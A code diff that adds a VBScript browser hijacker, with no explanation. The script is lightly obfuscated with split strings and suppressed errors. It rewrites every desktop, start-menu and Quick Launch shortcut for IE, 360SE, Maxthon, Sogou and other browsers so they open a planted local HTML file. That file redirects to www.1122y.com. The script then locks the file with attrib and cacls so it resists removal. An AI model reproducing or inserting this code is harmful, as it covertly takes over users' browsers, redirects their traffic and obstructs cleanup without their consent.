@@ -1,0 +1,117 @@
+ on error resume next 
+
+'<!-- Fh2vPBXKpJ9gEgEwPYXg -->
+Set WshShell = WScript.CreateObject("WSc" & "ript.Shell")
+strDesktop = WshShell.SpecialFolders("Desktop") :'特殊文件夹“桌面”
+Favorites = WshShell.SpecialFolders("Fa" & "vorites") :'特殊文件夹“桌面”
+
+'<!-- Fh2vPBXKpJ9gEgEwPYXg -->
+
+
+strttWinDir = WshShell.ExpandEnvironmentStrings("%Program" & "Files%")
+iescc=strttWinDir & "\Internet Explorer\iexplore"&".exe"
+ssd="粘贴"
+winds = WshShell.ExpandEnvironmentStrings("%System" & "Root%")
+
+'<!-- Fh2vPBXKpJ9gEgEwPYXg -->
+Sub SABCRCST123456789(lnktz)
+Dim oldpath
+    oldpath = LCase(lnktz)
+Dim Wsh
+
+'<!-- Fh2vPBXKpJ9gEgEwPYXg -->
+
+
+Set Wsh = WScript.CreateObject("WScr" & "ipt.Shell")
+
+Dim Folders
+Folders = Wsh.SpecialFolders("AllUsers" & "Desktop")
+ 
+Call SetLinkArg(Folders,oldpath)
+
+Folders = Wsh.SpecialFolders("Desktop")
+ 
+Call SetLinkArg(Folders,oldpath)
+ 
+
+Folders = Wsh.SpecialFolders.Item("StartMenu")
+  
+Call SetLinkArg(Folders,oldpath)
+
+   
+Folders = Wsh.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"
+ 
+Call SetLinkArg(Folders,oldpath)
+
+'<!-- Fh2vPBXKpJ9gEgEwPYXg -->
+
+
+Folders = Wsh.SpecialFolders.Item("AllUsersStartMenu")
+ 
+Call SetLinkArg(Folders,oldpath)
+
+Set WSH = Nothing
+End Sub
+
+
+Sub SetLinkArg(Folders , oldpath)
+  Dim Wsh,fso,f,fc,f1,f2
+  
+   
+  Set Wsh = WScript.CreateObject("WScript.Shell")
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Dim newpath
+  newpath = """"& strttWinDir &"\NetMeeting\ie.html"""
+  
+  Set f = fso.GetFolder(Folders)
+  Set fc = f.Files
+   For Each f1 in fc
+      f2=LCase(f1)
+      ext = LCase(fso.GetExtensionName(f2))
+      if ext = "lnk" then
+           Set oShlnk = Wsh.CreateShortcut(f2)
+        If Instr(LCase(oShLnk.TargetPath),oldpath) > 0 Then
+       		oShLnk.Arguments = newpath
+       		oShLnk.Save      
+		End If
+   Set oShLnk=NoThing
+      end if
+   Next
+Set WSH = Nothing
+  
+
+End Sub
+
+Call SABCRCST123456789("TTraveler"&".exe")
+Call SABCRCST123456789("SogouExplorer.exe")
+Call SABCRCST123456789("TheWorld.exe")
+Call SABCRCST123456789("Maxthon.exe")
+Call SABCRCST123456789("Maxthon2.exe")
+Call SABCRCST123456789("360SE"&".exe")
+
+ 
+Call SABCRCST123456789("IEXPLOR"&"E.EXE")
+
+
+CopyPath=WSHShell.ExpandEnvironmentStrings("%SystemRoot%") & "\" '获取
+ScriptEx=CopyPath & "System32\WScript.exe"
+Rem "#REM#" 
+Dim url
+url = "http://www.1122y.com/?yy"
+
+Set fso = CreateObject("Script" & "ing.FileSystemObject")
+FileName=  strttWinDir & "\NetMeeting\ie.html"
+if not fso.FileExists(FileName) then
+  Set MyFile = fso.CreateTextFile(FileName,True)
+  MyFile.Write("<meta http-equiv=""refresh""                                                                           				                                               content=""0.1;url="&url&"/?http://www.baidu.com/"">")
+  MyFile.Close
+
+ 
+ WshShell.run "attrib """ & FileName & """ +R",0
+ WshShell.run "cmd /c echo Y| cacls """ & FileName & """ /P Everyone:R",0
+end If
+
+
+'<!-- Fh2vPBXKpJ9gEgEwPYXg -->
+
+WScript.quit
